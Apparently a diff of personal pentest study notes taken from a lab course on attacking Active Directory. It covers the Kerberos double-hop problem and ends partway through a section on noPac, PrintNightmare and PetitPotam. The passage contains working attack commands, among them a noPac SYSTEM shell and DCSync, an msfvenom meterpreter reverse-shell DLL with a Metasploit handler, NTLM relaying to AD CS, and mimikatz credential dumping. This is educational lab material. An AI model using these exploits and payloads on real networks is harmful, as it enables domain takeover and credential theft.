@@ -1,4 +1,4 @@
-ett  JPT
+tt  JPT
 #Note taking tools
 		
 	Cherrytree	Visual Studio Code	Evernote
@@ -7815,9 +7815,6 @@ Our enumeration up to this point has given us a broad picture of the domain and 
 [+] Kerberoasting - from Windows
 
 
-
-
-
 * Kerberoasting - Semi Manual method
 	> Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in setspn binary to enumerate SPNs in the domain.
 	> Enumerating SPNs with setspn.exe
@@ -8832,6 +8829,1278 @@ image
 	> This section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.
 	> Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed SYSTEM access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous SeImpersonatePrivilege right.
 	> The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.
+
+[+] Kerberos "Double Hop" Problem
+
+	* There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.
+
+		* Background
+
+	> The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.
+	> The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.
+	> Let's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the backupadm user in memory.
+
+		PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
+		[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
+		[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+
+			mimikatz(commandline) # privilege::debug
+			mimikatz(commandline) # sekurlsa::logonpasswords
+			mimikatz(commandline) # exit
+
+	> There are indeed processes running in the context of the backupadm user, such as wsmprovhost.exe, which is the process that spawns when a Windows Remote PowerShell session is spawned.
+		[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
+
+	> In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.
+	> Let's say we have three hosts: Attack host --> DEV01 --> DC01. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01.
+		(https://academy.hackthebox.com/storage/modules/143/double_hop.png)
+
+	> When we connect to DEV01 using a tool such as evil-winrm, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as PowerView and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.
+	> If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGS Ticket is cached, which has the ability to sign TGTs and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.
+	> To confirm/find computers on a domain that have unrestricted kerberos delegation property set:
+		Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
+
+* Workarounds
+
+	> A few workarounds for the double-hop issue are covered in this post(https://posts.slayerlabs.com/double-hop/). We can use a "nested" Invoke-Command to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an evil-winrm session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)
+
+* Workaround #1: PSCredential Object
+	> We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.
+	> After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.
+
+		*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
+
+			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+			*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
+			Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+			"
+			At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+			+             else { $Results = $UserSearcher.FindAll() }
+			+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+			    + FullyQualifiedErrorId : DirectoryServicesCOMException
+
+	> If we check with klist, we see that we only have a cached Kerberos ticket for our current server.
+
+		*Evil-WinRM* PS C:\Users\backupadm\Documents> klist
+			Current LogonId is 0:0x57f8a
+			Cached Tickets: (1)
+			#0> Client: backupadm @ INLANEFREIGHT.LOCAL
+			    Server: academy-aen-ms0$ @
+			    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+			    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
+			    Start Time: 6/28/2022 7:31:53 (local)
+			    End Time:   6/28/2022 7:46:53 (local)
+			    Renew Time: 7/5/2022 7:31:18 (local)
+			    Session Key Type: AES-256-CTS-HMAC-SHA1-96
+			    Cache Flags: 0x4 -> S4U
+			    Kdc Called: DC01.INLANEFREIGHT.LOCAL
+
+	> So now, let's set up a PSCredential object and try again. First, we set up our authentication.
+		*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+		*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+
+	> Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.
+		*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
+		
+			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+			|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+			
+			samaccountname
+			--------------
+			azureconnect
+			backupjob
+			krbtgt
+			mssqlsvc
+			sqltest
+			sqlqa
+			sqldev
+			mssqladm
+			svc_sql
+			sqlprod
+			sapsso
+			sapvc
+			vmwarescvc
+
+	> If we try again without specifying the -credential flag, we once again get an error message.
+		*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 
+		|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+		|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+		Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+		"
+		At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+		+             else { $Results = $UserSearcher.FindAll() }
+		+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+		    + FullyQualifiedErrorId : DirectoryServicesCOMException
+
+	> If we RDP to the same host, open a CMD prompt, and type klist, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.
+		C:\htb> klist
+		Current LogonId is 0:0x1e5b8b
+		Cached Tickets: (4)
+		#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+		        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+		        Start Time: 6/28/2022 9:13:38 (local)
+		        End Time:   6/28/2022 19:13:38 (local)
+		        Renew Time: 7/5/2022 9:13:38 (local)
+		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+		        Cache Flags: 0x2 -> DELEGATION
+		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+		
+		#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
+		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+		        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+		        Start Time: 6/28/2022 9:13:38 (local)
+		        End Time:   6/28/2022 19:13:38 (local)
+		        Renew Time: 7/5/2022 9:13:38 (local)
+		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+		        Cache Flags: 0x1 -> PRIMARY
+		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+		
+		#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
+		        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+		        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+		        Start Time: 6/28/2022 9:13:38 (local)
+		        End Time:   6/28/2022 19:13:38 (local)
+		        Renew Time: 7/5/2022 9:13:38 (local)
+		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+		        Cache Flags: 0
+		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+		
+		#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
+		        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+		        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+		        Start Time: 6/28/2022 9:13:38 (local)
+		        End Time:   6/28/2022 19:13:38 (local)
+		        Renew Time: 7/5/2022 9:13:38 (local)
+		        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+		        Cache Flags: 0
+		        Kdc Called: DC01.INLANEFREIGHT.LOCAL
+
+* Workaround #2: Register PSSession Configuration
+	> We've seen what we can do to overcome this problem when using a tool such as evil-winrm to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the Enter-PSSession cmdlet? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).
+	> Let's start by first establishing a WinRM session on the remote host.
+		PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
+
+	> If we check for cached tickets using klist, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.
+		[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist
+			Current LogonId is 0:0x11e387
+			Cached Tickets: (1)
+			#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+			       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+			       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+			       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+			       Start Time: 6/28/2022 9:09:19 (local)
+			       End Time:   6/28/2022 19:09:19 (local)
+			       Renew Time: 0
+			       Session Key Type: AES-256-CTS-HMAC-SHA1-96
+			       Cache Flags: 0x8 -> ASC
+			       Kdc Called:
+
+	> We also cannot interact directly with the DC using PowerView
+		[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
+		[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
+			Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+			"
+			At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+			+             else { $Results = $UserSearcher.FindAll() }
+			+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+			   + FullyQualifiedErrorId : DirectoryServicesCOMException
+
+	> One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet.
+		PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+
+			WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
+			a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
+			PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
+			WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
+			recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
+			 required.
+			All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
+			configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
+			
+			   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
+			
+			Type            Keys                                Name
+			----            ----                                ----
+			Container       {Name=backupadmsess}                backupadmsess
+
+	> Once this is done, we need to restart the WinRM service by typing Restart-Service WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
+	> After we start the session, we can see that the double hop problem has been eliminated, and if we type klist, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the backupadm user and all requests from our local machine will be sent directly to the Domain Controller.
+		PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+		[DEV01]: PS C:\Users\backupadm\Documents> klist
+			Current LogonId is 0:0x2239ba
+			
+			Cached Tickets: (1)
+			
+			#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
+			       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+			       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+			       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+			       Start Time: 6/28/2022 13:24:37 (local)
+			       End Time:   6/28/2022 23:24:37 (local)
+			       Renew Time: 7/5/2022 13:24:37 (local)
+			       Session Key Type: AES-256-CTS-HMAC-SHA1-96
+			       Cache Flags: 0x1 -> PRIMARY
+			       Kdc Called: DC01
+
+	> We can now run tools such as PowerView without having to create a new PSCredential object.
+		[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
+			samaccountname
+			--------------
+			azureconnect
+			backupjob
+			krbtgt
+			mssqlsvc
+			sqltest
+			sqlqa
+			sqldev
+			mssqladm
+			svc_sql
+			sqlprod
+			sapsso
+			sapvc
+			vmwarescvc
+
+	> Note: We cannot use Register-PSSessionConfiguration from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like -RunAsCredential $Cred, we will get an error because we can only use RunAs from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment. .
+	> We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process) that we won't cover here.
+
+* Wrap Up
+	> In this section, we've seen how to overcome the Kerberos "Double Hop" problem when working with WinRM in an AD environment. We will encounter this often during our assessments, so we must understand the issue and have certain tactics in our toolbox to avoid losing time.
+	> The following section will cover other ways to escalate privileges and move laterally in a domain once we have valid credentials using various critical vulnerabilities identified throughout 2021.
+
+
+-=-=
+[+] Bleeding Edge Vulnerabilities
+	> When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as Zerologon(https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or DCShadow(https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the PrintNightmare attack could potentially crash the print spooler service on a remote host and cause a service disruption.
+
+	> As information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.
+
+* Scenario Setup
+	> In this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using ntlmrelayx.py and petitpotam.py to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.
+
+* NoPac (SamAccountName Spoofing)
+
+	> A great example of an emerging threat is the Sam_The_Admin vulnerability(https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called noPac or referred to as SamAccountName Spoofing released at the end of 2021. This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.
+		- 42278 is a bypass vulnerability with the Security Account Manager (SAM). 	
+		- 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.
+
+	> This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers(https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain) to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post(https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
+	> We can use this tool(https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in /opt/noPac.
+	> NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:
+	> Ensuring Impacket is Installed
+		m1l0js@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
+	> Ensuring Impacket is Installed
+		m1l0js@htb[/htb]$ python setup.py install 
+	> Cloning the NoPac Exploit Repo
+		m1l0js@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
+
+	> Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.
+	> Scanning for NoPac
+		m1l0js@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+
+	> There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.
+	> Running NoPac & Getting a Shell
+		m1l0js@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+	> We will notice that a semi-interactive shell session is established with the target using smbexec.py. Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using cd.
+	> It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.
+	> Confirming the Location of Saved Tickets
+		m1l0js@htb[/htb]$ ls
+		administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
+README.md  scanner.py
+	> We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.
+	> Using noPac to DCSync the Built-in Administrator Account
+		m1l0js@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+* Windows Defender & SMBEXEC.py Considerations
+	> If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called BTOBTO. Another service called BTOBO is created, and any command we type is sent to the target over SMB inside a .bat file called execute.bat. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.
+
+* Windows Defender Quarantine Log => (https://academy.hackthebox.com/storage/modules/143/defenderLog.png)
+
+	> If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.
+
+
+* PrintNightmare
+	> PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.
+	> Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using cube0x0's exploit. We can use Git to clone it to our attack host:
+	> Cloning the Exploit
+		m1l0js@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
+
+	> For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:
+	> Install cube0x0's Version of Impacket
+		pip3 uninstall impacket
+		git clone https://github.com/cube0x0/impacket
+		cd impacket
+		python3 ./setup.py install
+
+	> We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
+	> Enumerating for MS-RPRN
+		m1l0js@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+		Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+		Protocol: [MS-RPRN]: Print System Remote Protocol 
+
+	> After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.
+	> Generating a DLL Payload
+		m1l0js@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
+
+	> We will then host this payload in an SMB share we create on our attack host using smbserver.py.
+	> Creating a Share with smbserver.py
+		m1l0js@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+
+	> Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
+	> Configuring & Starting MSF multi/handler
+		[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+		[*] Using configured payload generic/shell_reverse_tcp
+		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		PAYLOAD => windows/x64/meterpreter/reverse_tcp
+		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.129.202.111
+		LHOST => 10.3.88.114
+		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+		LPORT => 8080
+		[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+		
+		[*] Started reverse TCP handler on 10.129.202.111:8080 
+
+	> With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:
+	> Running the Exploit
+		m1l0js@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
+
+
+	> Notice how at the end of the command, we include the path to the share hosting our payload (\\<ip address of attack host>\ShareName\nameofpayload.dll). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
+	> Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.
+PetitPotam (MS-EFSRPC)
+
+	> PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools(https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
+	> This(https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.
+	> Let's walk through the attack. First off, we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as certi(https://github.com/zer1t0/certi) to attempt to locate it.
+	> Starting ntlmrelayx.py
+		m1l0js@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+
+	> In another window, we can run the tool PetitPotam.py(https://github.com/topotam/PetitPotam). We run this tool with the command python3 PetitPotam.py <attack host IP> <Domain Controller IP> to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.
+	> There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>. There is also a PowerShell implementation of the tool Invoke-PetitPotam.ps1 => (https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)
+	> Here we run the tool and attempt to coerce authentication via the EfsRpcOpenFileRaw(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.
